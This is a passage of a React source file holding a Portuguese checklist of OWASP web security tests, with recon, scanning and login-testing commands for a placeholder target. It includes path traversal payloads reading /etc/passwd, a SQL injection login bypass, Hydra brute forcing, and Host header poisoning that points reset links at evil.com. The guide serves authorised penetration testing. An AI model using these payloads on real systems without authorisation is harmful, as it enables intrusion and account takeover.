import { useState, useEffect } from "react";
const DB=[
{id:"INFO",name:"Information Gathering",icon:"🔍",color:"#00e5ff",tests:[
{id:"WSTG-INFO-01",title:"Conduct Search Engine Discovery Reconnaissance for Information Leakage",
resumo:"Usar motores de busca e Google Dorks para encontrar dados sensíveis do alvo expostos publicamente — documentos internos, painéis admin, credenciais em repositórios, subdomínios e configurações indexadas por engano.",
como:`【Google Dorks】
site:alvo.com.br filetype:pdf
site:alvo.com.br filetype:xls OR filetype:doc
site:alvo.com.br inurl:admin OR inurl:login
site:alvo.com.br intitle:"index of"
site:alvo.com.br ext:env OR ext:log OR ext:sql OR ext:bak
"alvo.com.br" password OR secret OR api_key
【Shodan / Censys】
→ shodan.io → hostname:alvo.com.br
→ search.censys.io → buscar domínio ou IP
→ CLI: shodan search hostname:alvo.com.br
【GitHub Leaks】
Buscar: "alvo.com.br" password OR token OR secret
trufflehog git https://github.com/org/repo
gitleaks detect --source=/path/to/repo
【Wayback Machine】
curl -s "https://web.archive.org/cdx/search/cdx?url=alvo.com.br/*&output=text&fl=original&collapse=urlkey" | sort -u
【Recon geral】
theHarvester -d alvo.com.br -b all
→ Também checar: Pastebin, IntelligenceX, Dehashed`,
tipo:"🔧 Tool + Manual",tools:"Google Dorks, Shodan, Censys, theHarvester, trufflehog, gitleaks, Wayback Machine"},
{id:"WSTG-INFO-02",title:"Fingerprint Web Server",
resumo:"Identificar o tipo e versão do servidor web (Apache, Nginx, IIS, etc.) através de banner grabbing, análise de headers e respostas a requests malformados. Permite buscar CVEs específicos da versão.",
como:`【Banner Grabbing】
curl -sI https://alvo.com.br
→ Procurar headers: Server, X-Powered-By, X-AspNet-Version
【Nmap】
nmap -sV -p80,443 alvo.com.br
nmap --script http-server-header -p80,443 alvo.com.br
【WhatWeb】
whatweb https://alvo.com.br -v
【Request malformado (fingerprint por error page)】
curl -sI -X INVALIDMETHOD https://alvo.com.br
curl -s "https://alvo.com.br/pagina-inexistente-xyz123"
→ Cada servidor gera error pages com padrão diferente
→ Apache mostra versão no rodapé do 404 padrão
→ IIS tem formato HTML específico
→ Nginx tem estilo minimalista
【Ordem dos headers】
→ Apache: Date, Server, Last-Modified, ETag, Content-Type
→ Nginx: Server, Date, Content-Type
→ IIS: Content-Type, Server, Date
→ A ordem dos headers ajuda quando Server é ocultado
【Wappalyzer】
→ Extensão no browser → visita o site → mostra stack`,
tipo:"🔧 Tool",tools:"curl, nmap, whatweb, Wappalyzer, httprint, Netcraft"},
{id:"WSTG-INFO-03",title:"Review Webserver Metafiles for Information Leakage",
resumo:"Analisar robots.txt, sitemap.xml, security.txt e outros metafiles que revelam diretórios ocultos, áreas restritas e estrutura interna da aplicação que não deveria ser pública.",
como:`【robots.txt】
curl -s https://alvo.com.br/robots.txt
→ Cada linha "Disallow:" é potencialmente algo sensível!
→ Acessar cada path listado e documentar
【sitemap.xml】
curl -s https://alvo.com.br/sitemap.xml
curl -s https://alvo.com.br/sitemap_index.xml
→ Listar todas as URLs → adicionar ao scope
【security.txt】
curl -s https://alvo.com.br/.well-known/security.txt
【Outros metafiles】
curl -s https://alvo.com.br/humans.txt
curl -s https://alvo.com.br/crossdomain.xml
curl -s https://alvo.com.br/clientaccesspolicy.xml
curl -s https://alvo.com.br/.well-known/openid-configuration
【Meta tags no HTML】
curl -s https://alvo.com.br | grep -iE "<meta|generator|author"`,
tipo:"📝 Manual + Tool",tools:"curl, Browser DevTools, Burp Suite, wget"},
{id:"WSTG-INFO-04",title:"Enumerate Applications on Webserver",
resumo:"Descobrir subdomínios, virtual hosts e aplicações esquecidas no mesmo servidor. Apps de staging/dev geralmente têm menos proteção e são vetores de ataque mais fáceis.",
como:`【Enumeração de subdomínios】
subfinder -d alvo.com.br -o subs.txt
amass enum -passive -d alvo.com.br
assetfinder --subs-only alvo.com.br
【Certificate Transparency (crt.sh)】
curl -s "https://crt.sh/?q=%.alvo.com.br&output=json" | jq '.[].name_value' | sort -u
【VHost bruteforce】
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://IP_ALVO -H "Host: FUZZ.alvo.com.br" -fs TAMANHO_DEFAULT
【DNS】
dig alvo.com.br ANY
dig -x IP_DO_ALVO
host -t ns alvo.com.br
【Verificar quais estão vivos】
cat subs.txt | httpx -silent -status-code -title -tech-detect`,
tipo:"🔧 Tool",tools:"subfinder, amass, ffuf, crt.sh, httpx, assetfinder, DNSdumpster"},
{id:"WSTG-INFO-05",title:"Review Webpage Content for Information Leakage",
resumo:"Examinar código-fonte HTML/JS buscando comentários de dev, API keys hardcoded, tokens, endpoints internos, senhas e informações sensíveis expostas no client-side.",
como:`【View Source】
Ctrl+U no browser → buscar:
→ <!-- (comentários HTML com TODO, FIXME, password)
→ api_key, apiKey, secret, token, password, endpoint
【Análise de JavaScript】
curl -s https://alvo.com.br | grep -oP 'src="[^"]*\\.js"'
→ Para cada JS:
curl -s https://alvo.com.br/path/file.js | grep -iE "api|key|secret|password|token|endpoint|internal"
【LinkFinder - extrair endpoints de JS】
python3 linkfinder.py -i https://alvo.com.br -d -o cli
【SecretFinder - extrair secrets de JS】
python3 SecretFinder.py -i https://alvo.com.br -e
【Source maps (.js.map)】
curl -s https://alvo.com.br/main.js.map
→ Se existir: reconstrói o código-fonte original!
【Crawl completo】
katana -u https://alvo.com.br -jc -d 3 | grep -iE "api|admin|internal"`,
tipo:"📝 Manual + Tool",tools:"Browser DevTools, curl, LinkFinder, SecretFinder, Katana, grep"},
{id:"WSTG-INFO-06",title:"Identify Application Entry Points",
resumo:"Mapear TODOS os pontos de entrada: formulários, parâmetros GET/POST, headers, cookies, APIs, uploads, WebSockets. Cada entry point é um vetor potencial de ataque que será testado nas fases seguintes.",
como:`【Burp Suite - crawl manual】
1. Proxy → 127.0.0.1:8080
2. Navegar TODA a aplicação autenticado
3. Target → Site Map → todos os endpoints mapeados
4. Para cada endpoint: anotar método, params, tipo de dado
【Crawl automatizado】
katana -u https://alvo.com.br -d 5 -jc -o endpoints.txt
hakrawler -url https://alvo.com.br -depth 3
gospider -s https://alvo.com.br -d 3 -c 10
【Descobrir parâmetros ocultos】
arjun -u https://alvo.com.br/endpoint -m GET,POST
paramspider -d alvo.com.br
【Para cada entry point documentar:】
• URL completa e método HTTP
• Parâmetros e tipo de dado aceito
• Se requer autenticação
• Content-Type (JSON, XML, form-data, etc)`,
tipo:"🔧 Tool + Manual",tools:"Burp Suite, Katana, hakrawler, Arjun, ParamSpider, gospider"},
{id:"WSTG-INFO-07",title:"Map Execution Paths Through Application",
resumo:"Documentar todos os fluxos da aplicação: login → dashboard, registro → verificação, checkout → pagamento. Entender as transições de estado revela onde a lógica pode ser bypassada ou manipulada.",
como:`【Fluxos para mapear】
1. Autenticação (login completo até dashboard)
2. Registro de conta (signup → email verify → ativação)
3. Recuperação de senha (forgot → email → reset)
4. Checkout/compra (carrinho → pagamento → confirmação)
5. Painel admin (se acessível)
6. Upload e processamento de arquivos
【Como fazer】
1. Navegar cada fluxo com Burp ligado
2. Em HTTP History: anotar sequência de requests
3. Identificar tokens/state transferidos entre steps
4. Verificar se é possível pular etapas
5. Criar diagrama de fluxo (draw.io ou Mermaid)
【Dica de ouro】
Testar acessar o step final diretamente sem
passar pelos anteriores → geralmente revela
falhas de validação de fluxo (workflow bypass)`,
tipo:"📝 Manual",tools:"Burp Suite, Browser, draw.io, anotações manuais"},
{id:"WSTG-INFO-08",title:"Fingerprint Web Application Framework",
resumo:"Identificar o framework (Laravel, Django, Spring, WordPress, Rails, etc.) via cookies, headers, paths padrão e arquivos específicos. Cada framework tem vulns, configs e comportamentos próprios que direcionam os testes.",
como:`【Cookies reveladores】
PHPSESSID → PHP
csrftoken / sessionid → Django
_rails_session → Ruby on Rails
JSESSIONID → Java (Spring/Tomcat)
laravel_session → Laravel
connect.sid → Express.js
ASP.NET_SessionId → ASP.NET
【Headers】
curl -sI https://alvo.com.br | grep -iE "x-powered|server|x-generator|x-drupal"
【Paths padrão para testar】
/wp-login.php → WordPress
/administrator/ → Joomla
/user/login → Drupal
/admin/login/ → Django Admin
/__debug__/ → Django Debug Toolbar
/actuator/ → Spring Boot
/elmah.axd → ASP.NET
【Ferramentas】
whatweb https://alvo.com.br -v
→ Wappalyzer (extensão no browser)
→ BuiltWith.com
【Dirbusting para framework】
ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -u https://alvo.com.br/FUZZ`,
tipo:"🔧 Tool + Manual",tools:"Wappalyzer, whatweb, BuiltWith, curl, ffuf, Retire.js"},
{id:"WSTG-INFO-09",title:"Fingerprint Web Application",
resumo:"Determinar a versão exata da aplicação para buscar CVEs específicos e exploits públicos. Diferente do INFO-08 (framework), aqui buscamos a versão precisa da instância.",
como:`【Arquivos de versão】
curl -s https://alvo.com.br/CHANGELOG.md
curl -s https://alvo.com.br/CHANGELOG.txt
curl -s https://alvo.com.br/VERSION
curl -s https://alvo.com.br/README.md
curl -s https://alvo.com.br/license.txt
curl -s https://alvo.com.br/composer.json
curl -s https://alvo.com.br/package.json
【Hash de arquivos estáticos】
curl -s https://alvo.com.br/static/style.css | md5sum
→ Comparar hash com versões conhecidas do software
【Nuclei】
nuclei -u https://alvo.com.br -t technologies/
nuclei -u https://alvo.com.br -t default-logins/
【Admin panel】
→ Geralmente mostra versão no rodapé
【Dica】
Se WordPress: /wp-includes/version.php
Se Joomla: /language/en-GB/en-GB.xml
Se Drupal: /CHANGELOG.txt`,
tipo:"🔧 Tool + Manual",tools:"curl, nuclei, whatweb, Wappalyzer, manual"},
{id:"WSTG-INFO-10",title:"Map Application Architecture",
resumo:"Mapear infraestrutura completa: WAF, CDN, load balancer, reverse proxy, servidores de app e DB. Entender a topologia revela bypass paths e pontos cegos de monitoramento.",
como:`【Detectar WAF】
wafw00f https://alvo.com.br
nmap --script http-waf-detect -p80,443 alvo.com.br
【Detectar CDN】
dig alvo.com.br → CNAME para Cloudflare/Akamai/Fastly?
curl -sI https://alvo.com.br | grep -iE "cf-ray|x-cache|x-cdn|via|x-akamai"
【Buscar IP real (bypass CDN)】
→ SecurityTrails, Censys, registros históricos DNS
→ Testar enviar request direto pro IP com Host header
【Load Balancer】
→ Fazer 10+ requests e comparar headers (Server, Date)
→ IPs diferentes = load balancer
【Mapear backend】
→ Erros 502/503 podem revelar backend
→ Headers como X-Backend-Server, X-Upstream
→ traceroute alvo.com.br
【Documentar diagrama completo】
Internet → CDN/WAF → Load Balancer → App Server → DB`,
tipo:"🔧 Tool + Manual",tools:"wafw00f, nmap, dig, curl, traceroute, SecurityTrails"},
]},
{id:"CONFIG",name:"Configuration & Deploy Management Testing",icon:"⚙️",color:"#ff6e40",tests:[
{id:"WSTG-CONF-01",title:"Test Network Infrastructure Configuration",
resumo:"Testar configuração de rede: portas desnecessárias abertas, serviços desatualizados, firewalls fracos e infraestrutura mal configurada que amplia a superfície de ataque.",
como:`nmap -sV -sC -p- alvo.com.br
→ Identificar TODAS as portas abertas
→ Verificar se serviços (FTP, Telnet, SMB) são necessários
→ Para cada serviço: searchsploit <serviço> <versão>
masscan -p0-65535 IP_ALVO --rate=1000
nikto -h https://alvo.com.br
nmap --script vuln alvo.com.br`,
tipo:"🔧 Tool",tools:"nmap, masscan, Nikto, Nessus, OpenVAS, searchsploit"},
{id:"WSTG-CONF-02",title:"Test Application Platform Configuration",
resumo:"Verificar se debug está desabilitado, error pages são customizadas, directory listing está off, e não há consoles/endpoints de admin ou monitoramento expostos em produção.",
como:`【Directory listing】
curl -s https://alvo.com.br/images/
curl -s https://alvo.com.br/assets/
→ Se listar arquivos = directory listing ativo
【Debug/Status endpoints】
curl -s https://alvo.com.br/server-status
curl -s https://alvo.com.br/server-info
curl -s https://alvo.com.br/actuator
curl -s https://alvo.com.br/actuator/env
curl -s https://alvo.com.br/phpinfo.php
curl -s https://alvo.com.br/console
curl -s https://alvo.com.br/debug
curl -s https://alvo.com.br/__debug__/
curl -s https://alvo.com.br/elmah.axd
curl -s https://alvo.com.br/trace.axd
【Provocar erros】
curl -s "https://alvo.com.br/x?id='"
→ Stack trace = debug ativo = info leak grave
【Nikto】
nikto -h https://alvo.com.br`,
tipo:"🔧 Tool + Manual",tools:"curl, Nikto, Burp Suite, nuclei"},
{id:"WSTG-CONF-03",title:"Test File Extensions Handling for Sensitive Information",
resumo:"Testar extensões de backup (.bak, .old, .swp, ~) que podem expor código-fonte, configs e credenciais. Servidores frequentemente servem esses arquivos como texto plano.",
como:`Para cada arquivo importante encontrado, testar:
curl -s https://alvo.com.br/config.php.bak
curl -s https://alvo.com.br/config.php.old
curl -s https://alvo.com.br/config.php~
curl -s https://alvo.com.br/config.php.swp
curl -s https://alvo.com.br/config.php.save
curl -s https://alvo.com.br/.config.php.swp
curl -s https://alvo.com.br/web.config.bak
【Bruteforce de extensões】
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt -u https://alvo.com.br/indexFUZZ
【Arquivos sensíveis comuns】
curl -s https://alvo.com.br/.DS_Store
curl -s https://alvo.com.br/Thumbs.db
curl -s https://alvo.com.br/.idea/workspace.xml`,
tipo:"🔧 Tool + Manual",tools:"curl, ffuf, Burp Intruder, dirsearch"},
{id:"WSTG-CONF-04",title:"Review Old Backup and Unreferenced Files for Sensitive Information",
resumo:"Buscar arquivos de backup, dumps de banco, arquivos de versionamento (.git, .svn) e configs (.env) que foram esquecidos no servidor e contêm dados críticos.",
como:`【Diretórios de versionamento】
curl -s https://alvo.com.br/.git/HEAD
curl -s https://alvo.com.br/.git/config
curl -s https://alvo.com.br/.svn/entries
curl -s https://alvo.com.br/.hg/store/fncache
→ Se acessível: git-dumper https://alvo.com.br/.git/ output/
【Arquivos de configuração】
curl -s https://alvo.com.br/.env
curl -s https://alvo.com.br/.env.production
curl -s https://alvo.com.br/.env.local
curl -s https://alvo.com.br/wp-config.php.bak
curl -s https://alvo.com.br/config.yml
【Bruteforce de diretórios】
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://alvo.com.br/FUZZ -fc 404
dirsearch -u https://alvo.com.br -e php,asp,aspx,jsp,html,js,bak,old
【Dumps de banco】
curl -s https://alvo.com.br/backup.sql
curl -s https://alvo.com.br/dump.sql
curl -s https://alvo.com.br/db.sql`,
tipo:"🔧 Tool",tools:"ffuf, dirsearch, gobuster, git-dumper, curl"},
{id:"WSTG-CONF-05",title:"Enumerate Infrastructure and Application Admin Interfaces",
resumo:"Encontrar painéis administrativos expostos. Admin panels são alvos de alta prioridade — frequentemente têm credenciais padrão, menos proteção e acesso total ao sistema.",
como:`【Paths comuns】
curl -sI https://alvo.com.br/admin
curl -sI https://alvo.com.br/administrator
curl -sI https://alvo.com.br/wp-admin
curl -sI https://alvo.com.br/admin/login
curl -sI https://alvo.com.br/manage
curl -sI https://alvo.com.br/panel
curl -sI https://alvo.com.br/cpanel
curl -sI https://alvo.com.br/phpmyadmin
curl -sI https://alvo.com.br/adminer.php
【Portas alternativas】
nmap -sV -p8080,8443,8888,9090,3000,4443 alvo.com.br
【Bruteforce】
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://alvo.com.br/FUZZ -fc 404
【Google dorks】
site:alvo.com.br inurl:admin
site:alvo.com.br intitle:"login" OR intitle:"dashboard"`,
tipo:"🔧 Tool + Manual",tools:"ffuf, curl, nmap, dirsearch, Google Dorks"},
{id:"WSTG-CONF-06",title:"Test HTTP Methods",
resumo:"Verificar se métodos HTTP perigosos estão habilitados (PUT, DELETE, TRACE, CONNECT). PUT pode permitir upload de webshell; TRACE pode facilitar XST (Cross-Site Tracing).",
como:`【OPTIONS - listar métodos permitidos】
curl -sI -X OPTIONS https://alvo.com.br
→ Procurar header: Allow: GET, POST, PUT, DELETE, ...
【Testar cada método】
curl -sI -X PUT https://alvo.com.br/test.txt -d "teste"
curl -sI -X DELETE https://alvo.com.br/test.txt
curl -sI -X TRACE https://alvo.com.br
curl -sI -X CONNECT https://alvo.com.br
【Nmap】
nmap --script http-methods -p80,443 alvo.com.br
nmap --script http-method-tamper -p80,443 alvo.com.br
【Method Override headers】
curl -s https://alvo.com.br/admin -H "X-HTTP-Method-Override: PUT"
curl -s https://alvo.com.br/admin -H "X-Method-Override: DELETE"
curl -s https://alvo.com.br/admin -H "X-HTTP-Method: PATCH"`,
tipo:"🔧 Tool + Manual",tools:"curl, nmap, Burp Suite"},
{id:"WSTG-CONF-07",title:"Test HTTP Strict Transport Security",
resumo:"Verificar se HSTS está configurado corretamente — protege contra downgrade attacks, SSL stripping e força o browser a usar HTTPS. Sem HSTS, um MITM pode interceptar tráfego.",
como:`curl -sI https://alvo.com.br | grep -i strict
→ Esperado: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
【Verificar:】
✓ max-age >= 31536000 (1 ano)
✓ includeSubDomains presente
✓ preload (opcional mas recomendado)
【HTTP → HTTPS redirect】
curl -sI http://alvo.com.br
→ Deve retornar 301 para https://
【SSL Labs】
→ ssllabs.com/ssltest/analyze.html?d=alvo.com.br
【testssl.sh】
testssl.sh https://alvo.com.br`,
tipo:"🔧 Tool + Manual",tools:"curl, testssl.sh, SSLLabs, nmap"},
{id:"WSTG-CONF-08",title:"Test RIA Cross Domain Policy",
resumo:"Analisar crossdomain.xml e clientaccesspolicy.xml. Políticas permissivas (allow-access-from domain='*') permitem que qualquer site faça requests cross-domain ao alvo.",
como:`curl -s https://alvo.com.br/crossdomain.xml
curl -s https://alvo.com.br/clientaccesspolicy.xml
→ VULNERÁVEL se contém: allow-access-from domain="*"
→ Verificar se domínios permitidos são confiáveis
→ Também verificar CORS:
curl -sI https://alvo.com.br -H "Origin: https://evil.com" | grep -i access-control`,
tipo:"📝 Manual",tools:"curl, Burp Suite, Browser DevTools"},
{id:"WSTG-CONF-09",title:"Test File Permission",
resumo:"Verificar permissões de arquivos sensíveis — configs, logs, uploads e temp files com permissões abertas podem vazar dados ou permitir escrita maliciosa.",
como:`Tentar acessar:
curl -s https://alvo.com.br/.htaccess
curl -s https://alvo.com.br/web.config
curl -s https://alvo.com.br/WEB-INF/web.xml
curl -s https://alvo.com.br/tmp/
curl -s https://alvo.com.br/temp/
curl -s https://alvo.com.br/uploads/
→ Verificar se upload dir permite listagem
→ Verificar se é possível ler configs via path traversal`,
tipo:"📝 Manual + Tool",tools:"curl, Burp Suite, ffuf"},
{id:"WSTG-CONF-10",title:"Test for Subdomain Takeover",
resumo:"Verificar subdomínios apontando (CNAME) para serviços que foram removidos (S3, Heroku, GitHub Pages, Azure). Se o serviço não existe mais, um atacante pode reclamar o subdomínio.",
como:`【Enumerar + checar CNAME】
subfinder -d alvo.com.br | while read sub; do echo "$sub → $(dig +short CNAME $sub)"; done
【Ferramentas específicas】
subjack -w subs.txt -t 100 -o takeovers.txt
nuclei -l subs.txt -t http/takeovers/
【Manual】
dig sub.alvo.com.br CNAME
→ Se CNAME aponta pra: *.s3.amazonaws.com, *.herokuapp.com, *.azurewebsites.net, *.github.io
→ E retorna 404/NoSuchBucket → possível takeover!
【Referência】
github.com/EdOverflow/can-i-take-over-xyz`,
tipo:"🔧 Tool",tools:"subjack, nuclei, dig, can-i-take-over-xyz"},
{id:"WSTG-CONF-11",title:"Test Cloud Storage",
resumo:"Verificar se buckets S3, Azure Blobs ou GCP Storage estão públicos ou mal configurados, permitindo listagem, leitura ou até escrita em dados do alvo.",
como:`【AWS S3】
aws s3 ls s3://alvo-bucket --no-sign-request
aws s3 ls s3://alvo.com.br --no-sign-request
→ Testar variações: alvo, alvo-prod, alvo-backup, alvo-assets
【Ferramenta】
cloud_enum -k alvo -k alvo.com.br
【Azure Blobs】
curl -s "https://alvo.blob.core.windows.net/CONTAINER?restype=container&comp=list"
【GCP】
curl -s "https://storage.googleapis.com/alvo-bucket"
【grayhatwarfare.com】
→ Buscar nome da empresa → lista buckets públicos`,
tipo:"🔧 Tool",tools:"aws-cli, cloud_enum, S3Scanner, grayhatwarfare.com"},
]},
{id:"IDNT",name:"Identity Management Testing",icon:"🪪",color:"#ab47bc",tests:[
{id:"WSTG-IDNT-01",title:"Test Role Definitions",resumo:"Mapear todos os roles (admin, user, moderator) e verificar se a separação de privilégios está correta. Testar acesso cross-role para encontrar falhas de isolamento.",
como:`1. Criar contas com roles diferentes
2. Mapear funcionalidades de cada role
3. Com conta user → tentar acessar funcs de admin
4. Documentar role matrix (role × funcionalidade × acesso)
5. Verificar se há roles não documentados (superadmin, debug)`,tipo:"📝 Manual",tools:"Burp Suite, planilha para matrix"},
{id:"WSTG-IDNT-02",title:"Test User Registration Process",resumo:"Testar processo de registro: aceita dados inválidos? Permite duplicatas? Tem CAPTCHA? Faz validação server-side? Pode ser abusado para spam ou enumeração?",
como:`1. Registrar com email inválido / temporário
2. Testar campos obrigatórios vazios
3. Registrar mesmo email/user 2x
4. Testar CAPTCHA bypass (remover param, usar OCR)
5. Verificar rate limiting (10+ registros em sequência)
6. Testar injection nos campos (XSS, SQLi no nome/email)`,tipo:"📝 Manual",tools:"Burp Suite, tempmail, manual"},
{id:"WSTG-IDNT-03",title:"Test Account Provisioning Process",resumo:"Verificar processo completo de criação e remoção de contas — dados residuais após deleção, reativação de contas desabilitadas e controle de acesso no provisioning.",
como:`1. Criar conta → deletar conta → verificar se dados persistem
2. Tentar login com conta deletada
3. Verificar se email pode ser reutilizado
4. Testar reativação de conta desabilitada
5. Verificar se admin provisioning tem audit trail`,tipo:"📝 Manual",tools:"Burp Suite, manual testing"},
{id:"WSTG-IDNT-04",title:"Testing for Account Enumeration and Guessable User Account",resumo:"Verificar se é possível descobrir quais usernames/emails são válidos através de mensagens de erro diferentes, timing ou comportamento da aplicação no login/registro/reset.",
como:`【Login】
→ Tentar user válido com senha errada vs user inválido
→ Mensagem diferente? "Senha incorreta" vs "Usuário não encontrado" = enumeração!
→ Comparar response time (valid user pode ser mais lento)
→ Comparar response size/headers
【Forgot Password】
→ Enviar email válido vs inválido
→ Mensagem diferente = enumeração
【Registration】
→ Tentar registrar email já existente
→ "Email já cadastrado" = confirmação que existe
【Bruteforce com ffuf】
ffuf -w users.txt -X POST -d "user=FUZZ&pass=wrong" -u https://alvo.com.br/login -fr "Usuário não encontrado"`,tipo:"🔧 Tool + Manual",tools:"Burp Intruder, ffuf, wfuzz, comparação manual"},
{id:"WSTG-IDNT-05",title:"Testing for Weak or Unenforced Username Policy",resumo:"Verificar se a política de username é fraca — permite nomes triviais, previsíveis, sem restrição de formato, case-insensitive ou reutilizáveis.",
como:`1. Testar username de 1 caractere
2. Testar com espaços, caracteres especiais
3. Verificar case sensitivity (Admin vs admin)
4. Testar nomes previsíveis (admin, test, user1)
5. Verificar se username deletado pode ser reutilizado
6. Testar formato de email como username (válido?)`,tipo:"📝 Manual",tools:"Burp Suite, manual"},
]},
{id:"ATHN",name:"Authentication Testing",icon:"🔐",color:"#ef5350",tests:[
{id:"WSTG-ATHN-01",title:"Testing for Credentials Transported over an Encrypted Channel",resumo:"Verificar se login e credenciais trafegam SEMPRE via HTTPS. Se houver HTTP em qualquer ponto, um MITM pode interceptar senhas em texto plano.",
como:`curl -sI http://alvo.com.br/login → deve redirecionar 301 para HTTPS
curl -sI https://alvo.com.br/login → verificar que form action também é HTTPS
→ No Burp: interceptar POST do login → verificar se vai para HTTPS
→ Verificar mixed content (page HTTPS mas form action HTTP)
→ Testar com Wireshark: credenciais visíveis em plaintext?`,tipo:"🔧 Tool + Manual",tools:"curl, Burp Suite, Wireshark, testssl.sh"},
{id:"WSTG-ATHN-02",title:"Testing for Default Credentials",resumo:"Testar credenciais padrão em painéis admin, serviços e APIs. Muitos sistemas vêm com admin:admin, admin:password ou credenciais do vendor que nunca são trocadas.",
como:`【Testar manualmente】
admin:admin | admin:password | admin:123456
root:root | root:toor | test:test
→ Consultar: cirt.net/passwords (DB de default creds)
→ Consultar: github.com/ihebski/DefaultCreds-cheat-sheet
【Nuclei default logins】
nuclei -u https://alvo.com.br -t default-logins/
【Hydra (se não tiver lockout)】
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt alvo.com.br http-post-form "/login:user=^USER^&pass=^PASS^:F=incorreta"`,tipo:"🔧 Tool + Manual",tools:"nuclei, Hydra, cirt.net, DefaultCreds-cheat-sheet"},
{id:"WSTG-ATHN-03",title:"Testing for Weak Lock Out Mechanism",resumo:"Verificar se existe bloqueio após tentativas falhas de login, qual o threshold, se pode ser bypassado por IP rotation, e quanto tempo dura o lockout.",
como:`1. Tentar 5, 10, 15, 20 logins com senha errada
2. Bloqueia? Após quantas tentativas?
3. Mensagem muda quando bloqueia?
4. Testar bypass: trocar IP (X-Forwarded-For), trocar User-Agent
5. Verificar tempo de lockout (5min? 30min? permanente?)
6. Testar se lockout é por IP ou por conta
→ Burp Intruder: sequência de requests com senha errada`,tipo:"🔧 Tool + Manual",tools:"Burp Intruder, Hydra, curl"},
{id:"WSTG-ATHN-04",title:"Testing for Bypassing Authentication Schema",resumo:"Tentar acessar áreas protegidas sem autenticar: forced browsing, manipulação de cookies/tokens, SQLi no login, e acesso direto a URLs que deveriam exigir login.",
como:`【Forced browsing】
curl -s https://alvo.com.br/admin/dashboard (sem cookie de sessão)
curl -s https://alvo.com.br/api/users (sem auth header)
【Manipular cookie/token】
→ No Burp: remover cookie de sessão e re-enviar request
→ Alterar role em JWT (se JWT): jwt.io → mudar "role":"user" para "role":"admin"
→ Testar cookie com valor "admin=true" ou "authenticated=1"
【SQLi no login】
user: admin' OR '1'='1' --
pass: qualquercoisa
→ sqlmap -u "https://alvo.com.br/login" --data="user=admin&pass=test" --batch
【Parameter tampering】
→ Alterar parâmetros como isAdmin=true, role=admin na request`,tipo:"🔧 Tool + Manual",tools:"Burp Suite, sqlmap, curl, jwt.io"},
{id:"WSTG-ATHN-05",title:"Testing for Vulnerable Remember Password",resumo:"Analisar como o 'lembrar-me' é implementado — se o token é previsível, se expira, se está protegido. Um token fraco de remember-me permite account takeover.",
como:`1. Ativar 'lembrar-me' no login
2. Analisar cookie criado (nome, valor, flags)
3. Verificar se token é previsível (base64 de username?)
4. Testar se token expira após X dias
5. Verificar se token é invalidado após troca de senha
6. Decodificar valor: echo "VALOR" | base64 -d`,tipo:"📝 Manual",tools:"Browser DevTools, Burp Suite, base64"},
{id:"WSTG-ATHN-06",title:"Testing for Browser Cache Weaknesses",resumo:"Verificar se dados sensíveis (páginas autenticadas, dados pessoais) ficam no cache do browser. Após logout, pressionar 'Back' não deveria mostrar conteúdo protegido.",
como:`1. Fazer login → navegar páginas sensíveis → logout
2. Pressionar botão "Voltar" do browser
→ Se mostrar conteúdo = cache weakness!
【Headers esperados】
curl -sI https://alvo.com.br/dashboard | grep -iE "cache-control|pragma|expires"
→ Esperado: Cache-Control: no-store, no-cache
→ Esperado: Pragma: no-cache
【Autocomplete】
→ Verificar se forms de login têm autocomplete="off"
→ View source → procurar autocomplete nos inputs de senha`,tipo:"📝 Manual",tools:"Browser, curl, DevTools"},
{id:"WSTG-ATHN-07",title:"Testing for Weak Password Policy",resumo:"Testar a política de senhas — aceita senhas fracas? Qual o mínimo? Exige complexidade? Tem blacklist de senhas comuns? Aceita '123456' ou 'password'?",
como:`Testar criação/troca de senha com:
1. Senha de 1 caractere: "a"
2. Apenas números: "123456"
3. Senha comum: "password", "qwerty"
4. Sem caractere especial: "abcdefgh"
5. Senha = username
6. Verificar tamanho máximo
7. Verificar se aceita espaços
8. Testar se tem blacklist de senhas comuns`,tipo:"📝 Manual",tools:"Burp Suite, manual testing"},
{id:"WSTG-ATHN-08",title:"Testing for Weak Security Question Answer",resumo:"Verificar se a aplicação usa perguntas de segurança e se são fracas/previsíveis. Perguntas como 'nome da sua mãe' são facilmente descobertas via OSINT.",
como:`1. Verificar se usa security questions
2. As perguntas são fáceis de pesquisar? (nome da mãe, escola, etc)
3. Testar bruteforce de respostas (Burp Intruder)
4. Respostas são case-sensitive?
5. Há limite de tentativas?
6. Pode pular a pergunta?`,tipo:"📝 Manual",tools:"Burp Suite, manual"},
{id:"WSTG-ATHN-09",title:"Testing for Weak Password Change or Reset Functionalities",resumo:"Analisar fluxo de reset de senha: o token é previsível? Expira? Pode ser reusado? A senha antiga continua funcionando após reset? O link pode ser interceptado?",
como:`1. Solicitar reset de senha → interceptar email/link
2. Analisar token no link: é previsível? (timestamp? sequencial?)
3. Usar o token → funciona
4. Usar o MESMO token novamente → deveria falhar
5. Esperar 30min → token ainda funciona? (deve expirar)
6. Após reset: senha antiga ainda funciona? (não deveria)
7. Testar Host Header poisoning no reset:
   curl -X POST https://alvo.com.br/forgot -H "Host: evil.com" -d "email=vitima@email.com"
   → Se link no email usa evil.com = vuln!`,tipo:"📝 Manual + Tool",tools:"Burp Suite, email temp, curl"},
{id:"WSTG-ATHN-10",title:"Testing for Weaker Authentication in Alternative Channel",resumo:"Verificar se canais alternativos (app mobile, API, versão legacy) têm autenticação mais fraca que o canal principal. Atacante vai pelo caminho mais fácil.",
como:`1. Comparar auth da web vs app mobile vs API
2. API aceita auth básica enquanto web exige 2FA?
3. Existe endpoint legacy sem rate limiting?
4. OAuth implementation: testar redirect_uri manipulation
5. 2FA: testar se pode ser bypassado em algum canal
6. Verificar se existe /api/v1/ com auth mais fraca que /api/v2/`,tipo:"📝 Manual",tools:"Burp Suite, Postman, mobile proxy"},
]},
{id:"ATHZ",name:"Authorization Testing",icon:"🛡️",color:"#66bb6a",tests:[
{id:"WSTG-ATHZ-01",title:"Testing Directory Traversal File Include",resumo:"Testar se é possível sair do diretório raiz usando ../ para acessar arquivos do sistema como /etc/passwd. Inclui variações com encoding, null byte e wrappers.",
como:`【Payloads básicos】
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
